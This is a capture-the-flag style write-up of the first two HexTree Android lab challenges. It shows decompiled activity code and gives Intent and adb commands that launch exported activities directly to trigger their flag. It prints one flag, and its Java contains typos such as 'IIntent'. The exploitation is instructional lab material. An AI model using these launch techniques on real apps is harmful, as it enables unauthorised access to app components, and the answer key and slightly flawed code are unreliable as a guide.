---
title: Hextree Activities Challanges
date: 2025-06-20 20:14 +0300
categories: [Penetration Testing, Android Challenges]
tags: [Android Challenges, Activity, Penetration Testing, Hextree]
author: 0xAokiji
---

<h1 style="color: #4169E1; font-weight: bold; font-size: 32px;">Introduction</h1>


In this write-up, I’m sharing how I approached and solved the Android app challenges from the [HexTree Android Penetration Testing Lab](https://app.hextree.io/map). These challenges are made to help you think like a real Android penetration tester, and they cover everything from simple static analysis to more advanced dynamic stuff.

I mainly focused on understanding how the apps work, finding weak points, and then trying to exploit them using different tools and techniques.

Here are some of the tools I used along the way:

- **JADX**, **APKTool** – for looking into the app’s code  
- **Frida**, **ADB** – for playing with the app at runtime  
- **Android Studio**, **logcat** – for debugging and seeing what's going on behind the scenes

In each challenge, I’ll give:

- A quick overview of what the app does  
- The vulnerability or trick I found  
- How I exploited it  
- And finally, the flag or result I got
<hr style="border: none; border-top: 2px solid Gray;" />

<h2 style="color: #00BFFF; font-weight: bold; font-size: 22px;">In the next part, I’ll be showing the challenges related to Activities.</h2>


📦 You can also find the actual app used in these challenges on GitHub:  
👉 [hex_tree_Activities GitHub Repository](https://github.com/0xAokiji/hex_tree_Activities)

<img src="/assets/img/2025-06-20-hextree-activities-challenges/image.png" alt="Custom Domain" width="400" height="700" />
<p align="center"><em>Screenshot of the Challenge App</em></p>

<hr style="border: none; border-top: 2px solid Gray;" />


<h2 style="color: #00BFFF; font-weight: bold; font-size: 28px;">Challenge 1: Basic_Exported</h2>

<h3 style="color: #40E0D0; font-weight: bold; font-size: 20px;">Code Snippet (From Decompiled Source)</h3>


```java
public class Flag1Activity extends AppCompactActivity {
    public Flag1Activity() {
    }
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f = new LogHelper(this);
        this.f.addTag("basic-main-activity-avd2");
        success(this);
    }
}
```
<h3 style="color: #40E0D0; font-weight: bold; font-size: 22px;">Objective</h3>

- Launch the `Flag1Activity` directly to trigger the `success()` method and capture the flag.

<h3 style="color: #40E0D0; font-weight: bold; font-size: 22px;">Solution</h3>


<h4 style="color: #FF8C00; font-weight: bold; font-size: 18px;">Using Java Code (within another Activity):</h4>

```java
Intent intent = new Intent();
ComponentName componentName = new ComponentName(
    "io.hextree.attacksurface",
    "io.hextree.attacksurface.activities.Flag1Activity"
);
intent.setComponent(componentName);
startActivity(intent);
```
<h5 style="color: rgb(186, 199, 173); font-weight: bold; font-size: 16px;">Code Explanation:</h5>
- Once this code is executed, the specified Activity (Flag1Activity) is launched, which automatically triggers the success() method—this method is responsible for returning the flag within the app.


<img src="/assets/img/2025-06-20-hextree-activities-challenges/Pasted image.png" alt="Custom Domain" style="width: 900px; height: 100px;" />

**Flag = HXT{basic-exported-activity-1bh7sd}**


<h4 style="color: #FF8C00; font-weight: bold; font-size: 18px;">Using ADB (recommended for quick testing):</h4>


```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag1Activity
```
<hr style="border: none; border-top: 2px solid Gray;" />

<h2 style="color: #00BFFF; font-weight: bold; font-size: 28px;">Challenge 2: Intent with extras</h2>


<h3 style="color: #40E0D0; font-weight: bold; font-size: 22px;">Code Snippet (From Decompiled Source)</h3>

```java
public class Flag2Activity extends AppCompactActivity {
    public Flag2Activity() {

    }
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f = new LogHelper(this);
        String action = getIntent().getAction();
        if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
            return;
        }
        this.f.addTag(action);
        success(this);
    }
}
```

<h3 style="color: #40E0D0; font-weight: bold; font-size: 22px;">Objective</h3>


- At `onCreate()`, we need to trigger the `success` function.
- we have a condition: this condition is if action equals null or doesn’t equal this action `“**io.hextree.action.GIVE_FLAG"`** the application will return
- To trigger this function, we need to the action equal `“**io.hextree.action.GIVE_FLAG"**`

<h3 style="color: #40E0D0; font-weight: bold; font-size: 22px;">Solution</h3>

<h4 style="color: #FF8C00; font-weight: bold; font-size: 18px;">Using Java Code (within another Activity):</h4>


```java
IIntent intent = new Intent();
ComponentName conponentName = new ComponentName(
    "io.hextree.attacksurface",
    "io.hextree.attacksurface.activities.Flag2Activity");
intent.setAction("io.hextree.action.GIVE_FLAG");
intent.setComponent(conponentName);
startActivity(intent);
```

<h5 style="color:rgb(186, 199, 173); font-weight: bold; font-size: 16px;">Code Explanation:</h5>


- Here I use explicit intent to launch the Flag2Activity activity.
- Make the action is `“**io.hextree.action.GIVE_FLAG"`** by this line **`intent.setAction("io.hextree.action.GIVE_FLAG");`**
- Finally launch this activity

<h4 style="color: #FF8C00; font-weight: bold; font-size: 18px;">Using ADB (recommended for quick testing):</h4>

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag2Activity -a io.hextree.action.GIVE_FLAG
```